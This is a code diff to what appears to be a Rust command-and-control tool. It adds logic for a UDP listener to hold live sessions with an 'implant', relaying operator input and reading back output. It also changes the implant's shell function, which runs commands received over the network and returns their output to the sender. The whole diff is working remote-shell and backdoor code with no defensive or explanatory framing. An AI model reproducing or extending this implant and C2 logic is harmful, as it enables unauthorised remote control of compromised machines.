@@ -132,12 +132,27 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
     loop {
         // live interaction with the implant
         if is_interacting {
-
-
             // checks if client is terminating interaction with target_src
-
+            let cc: u8 = rcv_client_command(lsn, sb);
+            if cc == 6 {
+                is_interacting = false;
+                let code: u8 = 69;
+                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+            }
             // otherwise interact normally
-
+            else {
+                let mut sb_copy = sb.lock().unwrap();
+                if !vec_is_zero(&sb_copy.buff) {
+                    // send null byte to indicate no change in cc
+                    let code: u8 = 0;
+                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+                    // now send input
+                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
+                    let mut output = [0; 2048];
+                    lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output);
+                    sb_copy.buff = output.to_vec();
+                }
+            }
         }
         else {
             // check for client commands
@@ -154,12 +169,14 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                 4 => {
                     let mut flag: bool = true;
                     while flag {
-
                         let mut sb_copy = sb.lock().unwrap();
                         if !vec_is_zero(&sb_copy.buff) {
                             let code: u8 = 1;
                             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
+                            let mut output = [0; 2048];
+                            lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output);
+                            sb_copy.buff = output.to_vec();
                             flag = false;
                         }
                         else {
@@ -203,8 +220,8 @@ fn rcv_client_command(lsn: &mut Listener, sb: &mut Arc<Mutex<SharedBuffer>>) -> 
     }
     // just for testing
     let cc = sb_ref.cc;
-    let confirm = format!("Control Code Recieved: {cc}");
-    sb_ref.buff = confirm.as_bytes().to_vec();
+    //let confirm = format!("Control Code Recieved: {cc}");
+    //sb_ref.buff = confirm.as_bytes().to_vec();
     return sb_ref.cc;
 }
 
@@ -272,12 +289,7 @@ pub fn shell(sock: &mut UdpSocket) {
         if bytes != 0 {
             let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
             let cmd_out = format!("{}{}", execute_cmd(cmd), "\n>> ");
-            if cmd_out.ne(">> ") {
-                sock.send_to(cmd_out.as_bytes(), src);
-            }
-            else {
-                break;
-            }
+            sock.send_to(cmd_out.as_bytes(), src);
         }
     }
 }
